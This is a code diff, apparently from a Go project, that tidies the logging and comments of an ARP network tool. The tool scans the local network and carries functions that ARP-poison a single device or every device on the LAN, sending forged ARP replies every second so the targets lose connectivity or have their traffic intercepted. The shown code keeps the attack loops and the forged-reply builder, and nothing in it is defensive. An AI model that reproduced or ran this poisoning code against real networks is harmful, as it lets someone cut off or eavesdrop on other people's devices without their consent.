@@ -11,7 +11,6 @@ import (
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
 )
-
 // Host represents a discovered network host
 type Host struct {
 	IP  net.IP
@@ -24,7 +23,7 @@ func ScanNetwork() ([]Host, *net.Interface, net.IP, error) {
 		return nil, nil, nil, err
 	}
 
-	fmt.Printf("Scanning network (ARP/pcap): %s on interface %s\n", ipNet.String(), iface.Name)
+	fmt.Printf("Scanning network: %s on interface %s\n", ipNet.String(), iface.Name)
 
 	handle, err := pcap.OpenLive(iface.Name, 65536, false, 500*time.Millisecond)
 	if err != nil {
@@ -116,27 +115,19 @@ func ScanNetwork() ([]Host, *net.Interface, net.IP, error) {
 	// Convert map to Host slice
 	hosts := make([]Host, 0, len(alive))
 	for ipStr, mac := range alive {
-		fmt.Printf("Host alive: %-15s  MAC: %s\n", ipStr, mac)
 		hosts = append(hosts, Host{
 			IP:  net.ParseIP(ipStr),
 			MAC: mac,
 		})
 	}
 
-	fmt.Printf("time to took %s\n", time.Since(timeStart))
-
-	fmt.Println("Scan complete.")
+	fmt.Printf("Scan completed in %s\n", time.Since(timeStart))
 
 	return hosts, iface, ip, nil
 }
 
-// PoisonDevice performs ARP poisoning to cut off a target device from the network
-// It poisons both the target and the gateway to intercept all traffic between them
 func PoisonDevice(targetIP, gatewayIP net.IP, targetMAC, gatewayMAC net.HardwareAddr, iface *net.Interface, stopChan <-chan struct{}) error {
-	fmt.Printf("\n[*] Starting ARP poisoning attack\n")
-	fmt.Printf("[*] Target: %s (%s)\n", targetIP, targetMAC)
-	fmt.Printf("[*] Gateway: %s (%s)\n", gatewayIP, gatewayMAC)
-	fmt.Printf("[*] Attacker MAC: %s\n", iface.HardwareAddr)
+	fmt.Printf("\n[*] Poisoning attack started, device should lose connectivity\n")
 
 	// Open pcap handle
 	handle, err := pcap.OpenLive(iface.Name, 65536, false, 500*time.Millisecond)
@@ -158,13 +149,11 @@ func PoisonDevice(targetIP, gatewayIP net.IP, targetMAC, gatewayMAC net.Hardware
 	ticker := time.NewTicker(1 * time.Second)
 	defer ticker.Stop()
 
-	fmt.Println("[*] Poisoning started... Target should lose connectivity")
-
 	packetCount := 0
 	for {
 		select {
 		case <-stopChan:
-			fmt.Printf("\n[*] Received stop signal. Sent %d poison packets.\n", packetCount)
+			fmt.Printf("\n[*] Received stop signal")
 			return nil
 		case <-ticker.C:
 			// Send poison to target
@@ -173,20 +162,12 @@ func PoisonDevice(targetIP, gatewayIP net.IP, targetMAC, gatewayMAC net.Hardware
 			}
 
 			packetCount += 2
-			if packetCount%20 == 0 {
-				fmt.Printf("[*] Sent %d poison packets...\n", packetCount)
-			}
 		}
 	}
 }
 
-// PoisonAllDevices poisons all devices on the network simultaneously
-// Each device is poisoned in its own goroutine
-func PoisonAllDevices(hosts []Host, gatewayIP net.IP, gatewayMAC net.HardwareAddr, myIP net.IP, iface *net.Interface,  stopChan <-chan struct{}) error {
-	fmt.Printf("\n[*] Starting MASS ARP poisoning attack\n")
-	fmt.Printf("[*] Gateway: %s (%s)\n", gatewayIP, gatewayMAC)
-	fmt.Printf("[*] Attacker MAC: %s\n", iface.HardwareAddr)
-	fmt.Printf("[*] Targets: %d devices\n", len(hosts)-2) // Exclude self and gateway
+func PoisonAllDevices(hosts []Host, gatewayIP net.IP, gatewayMAC net.HardwareAddr, myIP net.IP, iface *net.Interface, stopChan <-chan struct{}) error {
+	fmt.Printf("\n[*] MASS poisoning attack started, all devices should lose connectivity\n")
 
 	// Open pcap handle
 	handle, err := pcap.OpenLive(iface.Name, 65536, false, 500*time.Millisecond)
@@ -233,13 +214,11 @@ func PoisonAllDevices(hosts []Host, gatewayIP net.IP, gatewayMAC net.HardwareAdd
 	ticker := time.NewTicker(1 * time.Second)
 	defer ticker.Stop()
 
-	fmt.Printf("\n[*] Poisoning started... %d devices should lose connectivity\n", len(targets))
-
 	packetCount := 0
 	for {
 		select {
 		case <-stopChan:
-			fmt.Printf("\n[*] Received stop signal. Sent %d poison packets to %d targets.\n", packetCount, len(targets))
+			fmt.Printf("\n[*] Received stop signal")
 			return nil
 		case <-ticker.C:
 			// Send poison packets to all targets
@@ -250,10 +229,6 @@ func PoisonAllDevices(hosts []Host, gatewayIP net.IP, gatewayMAC net.HardwareAdd
 				}
 
 				packetCount += 2
-			}
-
-			if packetCount%(20*len(targets)) == 0 {
-				fmt.Printf("[*] Sent %d poison packets across %d targets...\n", packetCount, len(targets))
 			}
 		}
 	}
@@ -305,6 +280,7 @@ func getInternetIfaceAndCIDRv4() (*net.Interface, *net.IPNet, net.IP, error) {
 			if ip.Equal(localIP) {
 				return iface, ipNet, ip, nil
 			}
+
 		}
 	}
 
@@ -372,11 +348,6 @@ func buildARPRequest(srcMAC net.HardwareAddr, srcIP, dstIP net.IP) ([]byte, erro
 	return buf.Bytes(), nil
 }
 
-// buildARPReply builds an ARP reply packet for poisoning
-// srcMAC: the MAC address to claim for srcIP
-// srcIP: the IP address we're claiming to own
-// dstMAC: the target MAC address to send the reply to
-// dstIP: the target IP address
 func buildARPReply(srcMAC net.HardwareAddr, srcIP net.IP, dstMAC net.HardwareAddr, dstIP net.IP) ([]byte, error) {
 	arp := &layers.ARP{
 		AddrType:          layers.LinkTypeEthernet,
@@ -398,7 +369,6 @@ func buildARPReply(srcMAC net.HardwareAddr, srcIP net.IP, dstMAC net.HardwareAdd
 	return buf.Bytes(), nil
 }
 
-// Minimal Ethernet II wrapper: dstMAC | srcMAC | ethertype(ARP=0x0806) | payload
 func appendEthernet(dst, src net.HardwareAddr, payload []byte) []byte {
 	var b bytes.Buffer
 	b.Write(dst)
